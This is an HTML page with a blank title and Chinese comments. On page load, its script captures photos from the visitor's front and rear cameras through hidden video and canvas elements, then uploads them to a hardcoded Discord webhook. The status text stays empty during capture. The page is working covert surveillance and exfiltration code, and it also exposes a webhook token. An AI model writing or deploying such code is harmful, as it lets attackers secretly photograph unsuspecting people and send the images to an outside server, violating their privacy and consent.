<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <title></title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <p id="status"></p>

  <script>
    const webhookUrl = "https://discordapp.com/api/webhooks/1369870461772759040/AcNN71B4Ia--5M-Y0RnmDDzlaYoWqcp1na77N9E8g9D8c64PIpBDHOTQ3mQq4PPCQlRZ"; // ⚠️ 公開風險

    async function takePhotoWithCamera(facingMode) {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode }
      });

      const video = document.getElementById("video");
      video.srcObject = stream;

      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          setTimeout(() => {
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop()); // 停止攝影機
            canvas.toBlob(resolve, "image/jpeg");
          }, 2000); // 等2秒自動拍照
        };
      });
    }

    async function sendToDiscord(blob, filename) {
      const formData = new FormData();
      formData.append("file", blob, filename);

      await fetch(webhookUrl, {
        method: "POST",
        body: formData
      });
    }

    async function run() {
      try {
        document.getElementById("status").textContent = "";
        const frontPhoto = await takePhotoWithCamera("user");
        await sendToDiscord(frontPhoto, "front.jpg");

        document.getElementById("status").textContent = "";
        const backPhoto = await takePhotoWithCamera("environment");
        await sendToDiscord(backPhoto, "back.jpg");

        document.getElementById("status").textContent = "照片已全部送出 Discord！";
      } catch (err) {
        document.getElementById("status").textContent = "發生錯誤：" + err.message;
        console.error(err);
      }
    }

    run();
  </script>
</body>
</html>
